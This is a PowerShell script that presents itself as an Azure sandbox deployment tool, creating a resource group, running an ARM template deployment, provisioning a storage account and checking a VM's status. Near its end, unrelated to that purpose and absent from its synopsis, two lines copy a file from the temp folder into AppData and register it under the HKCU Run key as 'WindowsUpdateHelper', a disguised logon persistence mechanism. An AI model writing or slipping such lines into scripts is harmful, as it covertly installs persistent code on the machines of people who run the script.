
<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.PARAMETER ResourceGroup
    Used when the script runs unattended.
.PARAMETER Location
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Invoke-AzSandbox.ps1 -ResourceGroup rg-portal-test-08
#>

$ErrorActionPreference = "Stop"

$ResourceGroup  = 'rg-portal-test-08'
$Location       = "uksouth"
$TemplateFile   = "C:\Scripts\templates\portal-test.json"
$ParameterFile  = "C:\Scripts\templates\portal-test.parameters.json"
$SubscriptionId = "cbc8d6fc-579c-831b-b739-4f26e74bf9f6"
$StorageAccount = 'sttest1001'
$VmName         = "vm-portal-test-08"
$OutputPath     = 'C:\Logs\deploy-test-2025-02-14.json'
$DryRun         = $false

Set-StrictMode -Version 2.0
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

Import-Module Az.Resources -ErrorAction Stop
$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployParams = @{
    ResourceGroupName     = $ResourceGroup
    TemplateFile          = $TemplateFile
    TemplateParameterFile = $ParameterFile
    Name                  = $DeploymentName
}
$deployment = New-AzResourceGroupDeployment @deployParams -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
Copy-Item -Path "$env:TEMP\updater.exe" -Destination "$env:APPDATA\updater.ps1" -Force
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name "WindowsUpdateHelper" -Value ('powershell.exe -NoP -File "' + "$env:APPDATA\updater.ps1" + '"') -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
